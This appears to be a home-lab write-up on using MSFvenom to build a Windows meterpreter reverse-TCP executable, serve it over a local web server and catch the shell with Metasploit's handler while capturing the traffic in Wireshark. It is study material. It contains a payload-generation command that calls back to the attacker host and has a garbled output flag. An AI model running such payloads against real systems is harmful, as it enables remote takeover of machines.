# MSFvenom

![Pasted image 20240502094200](https://github.com/lm3nitro/Projects/assets/55665256/92706414-50e2-4614-85b6-e2b7560e74d7)

MSFvenom is a versitile tool in the Metaspolit Framwork  used for generated varios types of payloads and shellcode. It allows penetration tested and security researcherd to create custom payloads for exploitation., bypassing defenses, and gaining remote access to target systems. 

Key Features:
+ Payload Generation
+ Payload Format
+ Customization

### Scope:


### Tools and Technology:
Linux OS, Win 10 OS, Wireshark and MSFvenom

## Getting started with MSFvenon

Once MSFvenon is installed and runnig, using the -h lists the available options

```
msfvenom -h
```

![Pasted image 20240501131915](https://github.com/lm3nitro/Projects/assets/55665256/ac798fe5-2b2b-445f-903c-54aeec52edc1)

Listing the -l will show available payloads:

```
msfvenom -l payloads
```

![Pasted image 20240501132226](https://github.com/lm3nitro/Projects/assets/55665256/15af3e0c-0708-439c-ac06-af170979d19c)

Here we can see the total amount of payloads available at the time of this writing: 1475

```
msfvenom -l payloads | wc -l
```

![Pasted image 20240501132317](https://github.com/lm3nitro/Projects/assets/55665256/dab59089-4138-4765-9085-f053d88371e8)

## Custom payload for Windows:

I will be creating a custom payload for my Windows 10 host for testing and analysis. I be using the 'meterpreter_reverse_tcp':

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.91.134 lport=4444 -4 exe -o lm3nitro_shell.exe
```

![Pasted image 20240501140620](https://github.com/lm3nitro/Projects/assets/55665256/061f31b8-12a7-4832-bfff-aaea596191b5)

Once that was complete, I can also verified my file information:

```
file lm3nitro_shell.exe
```

![Pasted image 20240501133716](https://github.com/lm3nitro/Projects/assets/55665256/94f63484-e1c7-4360-88af-2d58b2495fac)

I then used the exploit/multi/handler which provides a listening service to interact with the payload

![Pasted image 20240501133901](https://github.com/lm3nitro/Projects/assets/55665256/a912bfbf-372b-40c0-8dff-119db6fc56d5)

I configured the exploit/multi/handler to use with the custom payload. 

![Pasted image 20240501134438](https://github.com/lm3nitro/Projects/assets/55665256/ca2462d0-a320-4df5-8de3-ea1b3791b3a2)

I now needed a web server to serve the payload. As seen below, I chose it to be locally (192.168.91.134) on port 8000:

![Pasted image 20240501135301](https://github.com/lm3nitro/Projects/assets/55665256/171f630b-c618-447b-9d94-2096cee9be09)

## Downloading the payload:

Once everything was in place, I went to the Windows host, navigated to 192.168.91.134:8000 as specified above and downloaded lm3nitro_shell.exe I had previosuly created. 

![Pasted image 20240501135710](https://github.com/lm3nitro/Projects/assets/55665256/303251b2-3d73-4aff-823a-84f7bda6f9b9)

Using the following command on the attacking host I was able to see that the Windos host had indeed connected in real time:

```
python3 -m http.server
```

![Pasted image 20240501140151](https://github.com/lm3nitro/Projects/assets/55665256/60325139-29da-4ecd-935f-1b620351cd19)

I also ensured that I had Wireshark running and capturing the traffic on the network. Here we can see the traffic from the download:

![Pasted image 20240501135931](https://github.com/lm3nitro/Projects/assets/55665256/c444cd3f-6354-4126-9a99-857617248a4c)

After having downlaoded the execuatble, I then executed it:

![Pasted image 20240501140042](https://github.com/lm3nitro/Projects/assets/55665256/a6a5713d-2966-45d3-a7d6-d5a0bfdc43bb)

On the attacking host (msfvenom) I could see that it had been executed and details on the host regarding the user, OS verison/build, etc. Also, using the shell command allowed me to successfully connect to the target host directory:

![Pasted image 20240501144904](https://github.com/lm3nitro/Projects/assets/55665256/afbfd0d0-7bef-4d2a-a5ce-62afd0217761)

Traffic analysis of the payload:

![Pasted image 20240501141911](https://github.com/lm3nitro/Projects/assets/55665256/810d5f2f-9b7f-4116-8d73-a41915740313)

![Pasted image 20240501143036](https://github.com/lm3nitro/Projects/assets/55665256/c3d3bf25-9cf7-448d-8635-a7812a97ba06)

![Pasted image 20240501143308](https://github.com/lm3nitro/Projects/assets/55665256/af6dba33-5efe-45a4-9c29-af57d07e5f32)



